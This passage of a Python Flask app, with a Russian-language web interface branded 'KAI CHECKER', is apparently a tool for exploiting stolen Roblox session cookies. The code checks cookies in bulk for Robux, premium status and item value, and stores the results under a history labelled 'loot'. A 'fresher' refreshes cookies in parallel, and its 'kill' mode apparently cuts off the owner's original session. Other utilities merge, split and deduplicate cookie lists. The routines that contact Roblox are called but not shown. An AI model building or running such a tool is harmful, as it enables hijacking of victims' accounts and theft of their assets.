            <div class="result-container" id="fresherContainer" style="display:none;">
                <div class="result-header">
                    <span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span>
                    <div class="action-btn-group">
                        <button class="btn-download-txt" onclick="downloadTxtFromBox('fresherResult', 'refreshed_cookies.txt')">📥 Скачать TXT</button>
                        <button class="btn-toggle-box" id="btnToggle_fresherResult" onclick="toggleBox('fresherResult')">▼ Свернуть</button>
                    </div>
                </div>
                <div class="result-box" id="fresherResult"></div>
            </div>
        </div>
    </div>

    <!-- ИСТОРИЯ -->
    <div class="tab-content" id="tab-history">
        <div class="card">
            <h2>📋 История Чекера (Лут и Отчеты) <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2>
            <div id="checkerHistoryList">Загрузка истории...</div>
        </div>
        <div class="card">
            <h2>🔄 История Фрешера (Новые Куки) <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2>
            <div id="fresherHistoryList">Загрузка истории...</div>
        </div>
    </div>

    <!-- ИНСТРУМЕНТЫ -->
    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <!-- СЛИЯНИЕ -->
            <div class="card">
                <h3>🔗 Слияние TXT файлов</h3>
                <div class="upload-area" id="mergeDropArea" onclick="document.getElementById('mergeFiles').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файлы</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">выберите сразу несколько файлов</p>
                </div>
                <input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;">
                <div id="mergeFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:12px;width:100%;">Объединить в один TXT</button>
                <div class="result-box" id="mergeResult" style="display:none;margin-top:10px;"></div>
            </div>

            <!-- РАЗДЕЛЕНИЕ -->
            <div class="card">
                <h3>✂️ Разделение куки по файлам</h3>
                <div class="upload-area" id="splitDropArea" onclick="document.getElementById('splitFiles').click()">
                    <p style="font-weight:700;">📁 Загрузить TXT для разделения</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или вставьте куки вручную ниже</p>
                </div>
                <input type="file" id="splitFiles" accept=".txt" multiple style="display:none;">
                <div id="splitFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                
                <textarea id="splitInput" placeholder="Или вставьте куки списком..." rows="3" style="margin-top:10px;"></textarea>
                
                <div style="margin-top:10px;display:flex;align-items:center;gap:10px;">
                    <label style="font-size:12px;font-weight:700;color:var(--text-muted);white-space:nowrap;">Куков на файл:</label>
                    <input type="number" id="splitCount" value="1" min="1" style="padding:8px 12px;width:100px;">
                </div>
                <button class="btn btn-primary btn-sm" onclick="splitCookies()" style="margin-top:12px;width:100%;">Разделить и скачать ZIP</button>
                <div class="result-box" id="splitResult" style="display:none;margin-top:10px;"></div>
            </div>

            <!-- ДУБЛИКАТЫ -->
            <div class="card">
                <h3>🧹 Очистка от дубликатов</h3>
                <textarea id="cleanInput" placeholder="Вставьте куки для дедупликации..." rows="5"></textarea>
                <button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:12px;width:100%;">Удалить дубликаты</button>
                <div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div>
            </div>
        </div>
    </div>

    <!-- Подвал -->
    <div class="footer">KAI CHECKER © ALL RIGHTS RESERVED</div>
</div>

<script>
// --- КОМПАКТНОЕ УВЕДОМЛЕНИЕ СВЕРХУ-СБОКУ ---
let alertTimeout;

function showAlert(message) {
    const alertEl = document.getElementById('custom-alert');
    document.getElementById('custom-alert-msg').innerText = message || 'Вставьте кук!';
    
    alertEl.classList.add('show');

    clearTimeout(alertTimeout);
    alertTimeout = setTimeout(() => {
        closeAlert();
    }, 4000);
}

function closeAlert() {
    document.getElementById('custom-alert').classList.remove('show');
}

// --- АНИМАЦИЯ ЧАСТИЦ ---
const canvas = document.getElementById('particles-canvas');
const ctx = canvas.getContext('2d');
let particles = [];
function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

for(let i=0; i<40; i++) {
    particles.push({
        x: Math.random() * canvas.width, y: Math.random() * canvas.height,
        r: Math.random() * 2 + 1, dx: (Math.random() - 0.5) * 0.5, dy: (Math.random() - 0.5) * 0.5,
        alpha: Math.random() * 0.3 + 0.1
    });
}
function animateParticles() {
    ctx.clearRect(0,0,canvas.width,canvas.height);
    particles.forEach(p => {
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
        ctx.fillStyle = `rgba(217, 70, 239, ${p.alpha})`;
        ctx.shadowBlur = 6; ctx.shadowColor = '#a855f7'; ctx.fill();
        p.x += p.dx; p.y += p.dy;
        if(p.x<0 || p.x>canvas.width) p.dx *= -1;
        if(p.y<0 || p.y>canvas.height) p.dy *= -1;
    });
    requestAnimationFrame(animateParticles);
}
animateParticles();

// --- ВЛАДКИ ---
function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
    const targetContent = document.getElementById('tab-' + tabName);
    if(targetBtn && targetContent) {
        targetBtn.classList.add('active'); targetContent.classList.add('active');
        localStorage.setItem('kai_active_tab', tabName);
        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
});
window.addEventListener('DOMContentLoaded', () => {
    activateTab(localStorage.getItem('kai_active_tab') || 'checker');
});

function toggleTheme() {
    const html = document.documentElement;
    html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
}

function toggleBox(boxId) {
    const box = document.getElementById(boxId);
    const btn = document.getElementById('btnToggle_' + boxId);
    if (!box) return;
    if (box.style.display === 'none') {
        box.style.display = 'block';
        if (btn) btn.textContent = '▼ Свернуть';
    } else {
        box.style.display = 'none';
        if (btn) btn.textContent = '▶ Развернуть';
    }
}

function downloadTxtFromBox(boxId, defaultFilename = 'report.txt') {
    const box = document.getElementById(boxId);
    if (!box || !box.textContent.trim()) return showAlert('Нет данных для скачивания!');
    const blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = defaultFilename;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// --- УНИВЕРСАЛЬНАЯ НАСТРОЙКА DRAG & DROP ---
function setupDragAndDrop(areaId, inputId, infoId) {
    const area = document.getElementById(areaId);
    const input = document.getElementById(inputId);
    const info = document.getElementById(infoId);
    if(!area || !input) return;

    ['dragenter', 'dragover'].forEach(e => area.addEventListener(e, prev => {
        prev.preventDefault(); area.classList.add('drag-over');
    }));
    ['dragleave', 'drop'].forEach(e => area.addEventListener(e, prev => {
        prev.preventDefault(); area.classList.remove('drag-over');
    }));
    area.addEventListener('drop', e => {
        if(e.dataTransfer.files.length) {
            input.files = e.dataTransfer.files;
            if(info) info.textContent = `Выбрано файлов: ${input.files.length} (${input.files[0].name})`;
        }
    });
    input.addEventListener('change', function() {
        if(this.files.length && info) {
            info.textContent = `Выбрано файлов: ${this.files.length} (${this.files[0].name})`;
        }
    });
}

setupDragAndDrop('massDropArea', 'massFile', 'massFileInfo');
setupDragAndDrop('mergeDropArea', 'mergeFiles', 'mergeFileInfo');
setupDragAndDrop('splitDropArea', 'splitFiles', 'splitFileInfo');

// --- API ЛОГИКА ---
let lastMassReports = [];

async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return showAlert('Вставьте кук!');
    document.getElementById('singleContainer').style.display = 'block';
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('btnToggle_singleResult').textContent = '▼ Свернуть';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';
    
    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if(!file) return showAlert('Выберите TXT файл!');
    const fd = new FormData(); fd.append('file', file);
    document.getElementById('massContainer').style.display = 'block';
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
    document.getElementById('massProgress').style.width = '50%';
    document.getElementById('massResult').textContent = '⏳ Массовая проверка... (RAP, Playtime, Full Analysis)';
    
    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    document.getElementById('massProgress').style.width = '100%';
    setTimeout(() => document.getElementById('massProgress').style.width = '0%', 1000);
    
    if(data.success) {
        lastMassReports = data.full_reports || [];
        document.getElementById('statValid').textContent = data.valid_count;
        document.getElementById('statRobux').textContent = data.total_robux.toLocaleString();
        document.getElementById('statPremium').textContent = data.premium_count;
        document.getElementById('massResult').textContent = data.results.join('\n\n');
    }
}

async function downloadMassZip() {
    if (!lastMassReports.length) return showAlert('Нет готовых отчетов!');
    const res = await fetch('/api/download-zip', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({reports: lastMassReports})
    });
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'accounts_reports.zip';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
}

function setFresherMode(m) {
    document.getElementById('fresherMode').value = m;
    document.getElementById('btnDup').classList.remove('active-mode');
    document.getElementById('btnKill').classList.remove('active-mode');
    if(m === 'duplicate') document.getElementById('btnDup').classList.add('active-mode');
    else document.getElementById('btnKill').classList.add('active-mode');
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    const mode = document.getElementById('fresherMode').value;
    if(!cookies) return showAlert('Вставьте куки!');
    document.getElementById('fresherContainer').style.display = 'block';
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('btnToggle_fresherResult').textContent = '▼ Свернуть';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    
    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies, mode}) });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

// --- ИСТОРИЯ ---
async function loadCheckerHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.slice().reverse().forEach((i, idx) => {
        const resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
        const boxId = `chk_hist_${idx}`;
        const fileName = `checker_history_${i.timestamp.replace(/[:. ]/g, '_')}.txt`;

        html += `
        <div class="history-card">
            <div class="history-header">
                <span>🕒 ${i.timestamp} (${i.type === 'single' ? 'Одиночная' : 'Массовая'}) — Валид: ${i.valid} / ${i.total}</span>
                <div class="action-btn-group">
                    <button class="btn-download-txt" onclick="downloadTxtFromBox('${boxId}', '${fileName}')">📥 Скачать TXT</button>
                    <button class="btn-toggle-box" id="btnToggle_${boxId}" onclick="toggleBox('${boxId}')">▶ Развернуть</button>
                </div>
            </div>
            <div class="history-users">
                <span>👤 Аккаунты: ${usernames}</span>
            </div>
            <div class="result-box" id="${boxId}" style="display:none;">${resultsText}</div>
        </div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История чекера пуста';
}

async function loadFresherHistory() {
    const res = await fetch('/api/history/fresher');
    const data = await res.json();
    let html = '';
    data.history.slice().reverse().forEach((i, idx) => {
        const cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
        const boxId = `frs_hist_${idx}`;
        const modeTitle = i.mode === 'kill' ? '💀 Убийство куки' : '♻️ Дублирование';
        const fileName = `fresher_history_${i.timestamp.replace(/[:. ]/g, '_')}.txt`;
        html += `
        <div class="history-card">
            <div class="history-header">
                <span>🕒 ${i.timestamp} (Режим: ${modeTitle}) — Обновлено: ${i.refreshed_count} шт.</span>
                <div class="action-btn-group">
                    <button class="btn-download-txt" onclick="downloadTxtFromBox('${boxId}', '${fileName}')">📥 Скачать TXT</button>
                    <button class="btn-toggle-box" id="btnToggle_${boxId}" onclick="toggleBox('${boxId}')">▶ Развернуть</button>
                </div>
            </div>
            <div class="history-users">👤 Аккаунты: ${usernames}</div>
            <div class="result-box" id="${boxId}" style="display:none;">${cookiesText}</div>
        </div>`;
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История фрешера пуста';
}

async function clearCheckerHistory() {
    await fetch('/api/history/checker/clear', {method:'POST'}); loadCheckerHistory();
}

async function clearFresherHistory() {
    await fetch('/api/history/fresher/clear', {method:'POST'}); loadFresherHistory();
}

// --- ИНСТРУМЕНТЫ: СЛИЯНИЕ, РАЗДЕЛЕНИЕ И ОЧИСТКА ---
async function mergeCookies() {
    const files = document.getElementById('mergeFiles').files;
    if(files.length < 2) return showAlert('Выберите минимум 2 TXT файла для объединения!');
    const fd = new FormData(); Array.from(files).forEach(f => fd.append('files', f));
    
    const box = document.getElementById('mergeResult');
    box.style.display = 'block'; box.textContent = '⏳ Объединение файлов...';
    
    const res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
    const data = await res.json();
    if(data.success) {
        box.innerHTML = `✅ Успешно объединено! <br><a href="${data.download_url}" style="color:var(--accent-pink);font-weight:700;">📥 Скачать единый TXT файл</a>`;
    } else {
        box.textContent = '❌ Ошибка объединения';
    }
}

async function splitCookies() {
    const files = document.getElementById('splitFiles').files;
    const textInput = document.getElementById('splitInput').value;
    const perFile = parseInt(document.getElementById('splitCount').value) || 1;
    
    if(!files.length && !textInput.trim()) {
        return showAlert('Загрузите хотя бы один TXT файл или вставьте куки вручную!');
    }

    const fd = new FormData();
    Array.from(files).forEach(f => fd.append('files', f));
    fd.append('text', textInput);
    fd.append('per_file', perFile);

    const box = document.getElementById('splitResult');
    box.style.display = 'block'; box.textContent = '⏳ Разделение куки по файлам и создание ZIP...';

    const res = await fetch('/api/split-cookies', {method:'POST', body:fd});
    const data = await res.json();
    if(data.success) {
        box.innerHTML = `✅ Успешно разделено на ${data.total_files} файлов! <br><a href="${data.download_url}" style="color:var(--accent-pink);font-weight:700;">📦 Скачать ZIP-архив с файлами</a>`;
    } else {
        box.textContent = data.message || '❌ Ошибка при разделении';
    }
}

async function cleanCookies() {
    const content = document.getElementById('cleanInput').value;
    if(!content.trim()) return showAlert('Вставьте куки!');
    const box = document.getElementById('cleanResult');
    box.style.display = 'block'; box.textContent = '⏳ Очистка дубликатов...';
    
    const res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content})});
    const data = await res.json();
    if(data.success) {
        box.innerHTML = `✅ Найдено уникальных: ${data.count} шт. <br><a href="${data.download_url}" style="color:var(--accent-pink);font-weight:700;">📥 Скачать очищенный TXT</a>`;
    } else {
        box.textContent = '❌ Ошибка очистки';
    }
}
</script>
</body>
</html>"""

# ==========================================
# БЛОК: API МАРШРУТЫ
# ==========================================
@app.route("/")
def index():
    get_user_session_id()
    return render_template_string(HTML)

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({
        'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0,
        'usernames': [info['Username']] if info['status']=='✅' else ['Unauthed'],
        'results': [report],
        'full_reports': [{'username': info['Username'], 'user_id': info['UserID'], 'report': report}]
    })
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']
    formatted = [format_quick_report(r) for r in results]
    
    full_reports = []
    usernames = []
    for r in valid:
        if r.get('full_info'):
            full_reports.append({
                'username': r['username'],
                'user_id': r['user_id'],
                'report': format_full_report(r['full_info'])
            })
            usernames.append(r['username'])
            
    premium_count = sum(1 for r in valid if r.get('is_premium'))
    total_robux = sum(r.get('robux',0) for r in valid)
    
    add_checker_history({
        'type': 'mass', 'total': len(results), 'valid': len(valid),
        'usernames': usernames,
        'results': formatted,
        'full_reports': full_reports
    })
    return jsonify({
        "success": True, "valid_count": len(valid), "premium_count": premium_count,
        "total_robux": total_robux, "results": formatted, "full_reports": full_reports
    })

@app.route("/api/download-zip", methods=["POST"])
def api_download_zip():
    data = request.json or {}
    reports = data.get("reports", [])
    if not reports: return jsonify({"success": False, "message": "Нет отчетов"})
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for r in reports:
            fname = f"{r.get('username','user')}_{r.get('user_id','id')}.txt"
            zf.writestr(fname, r.get('report',''))
            
    zip_buffer.seek(0)
    return send_file(zip_buffer, mimetype="application/zip", as_attachment=True, download_name="roblox_accounts.zip")

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    
    only_cookies = []
    usernames = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(refresh_roblox_cookie, c, mode=='kill') for c in cookies_list]
        for f in as_completed(futures):
            res = f.result()
            if res['success'] and res['new_cookie']:
                only_cookies.append(res['new_cookie'])
                usernames.append(res.get('username','?'))
    
    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'usernames': usernames, 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/history/checker")
def api_history_checker():
    fp = get_user_history_file("checker")
    return jsonify({"history": load_history(fp)})

@app.route("/api/history/fresher")
def api_history_fresher():
    fp = get_user_history_file("fresher")
    return jsonify({"history": load_history(fp)})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    fp = get_user_history_file("checker")
    save_history(fp, [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    fp = get_user_history_file("fresher")
    save_history(fp, [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    files = request.files.getlist('files')
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    
    user_dir, sid = get_user_download_dir()
    filename = f"merged_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f: f.write(merged)
    
    return jsonify({"success": True, "download_url": f"/downloads/{sid}/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    files = request.files.getlist('files')
    text_input = request.form.get('text', '')
    per_file = int(request.form.get('per_file', 1))

    all_contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    if text_input: all_contents.append(text_input)

    cookies = extract_cookies_from_text('\n'.join(all_contents))
    if not cookies:
        return jsonify({"success": False, "message": "Валидные куки для разделения не найдены"})

    chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
    
    user_dir, sid = get_user_download_dir()
    zip_filename = f"splitted_cookies_{int(time.time())}.zip"
    zip_filepath = os.path.join(user_dir, zip_filename)

    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, chunk in enumerate(chunks, 1):
            file_data = '\n'.join(chunk)
            zf.writestr(f"cookies_part_{idx}.txt", file_data)

    return jsonify({
        "success": True,
        "total_files": len(chunks),
        "download_url": f"/downloads/{sid}/{zip_filename}"
    })

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    processed = remove_duplicates(data.get("content", ""))
    
    user_dir, sid = get_user_download_dir()
    filename = f"cleaned_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f: f.write(processed)
    count = len([line for line in processed.split('\n') if line.strip()])
    return jsonify({"success": True, "count": count, "download_url": f"/downloads/{sid}/{filename}"})

@app.route("/downloads/<sid>/<filename>")
def download_file(sid, filename):
    user_sid = get_user_session_id()
    if sid != user_sid:
        return jsonify({"error": "Forbidden"}), 403
    return send_from_directory(os.path.join("downloads", sid), filename, as_attachment=True)

# ==========================================
# ТОЧКА ВХОДА
# ==========================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
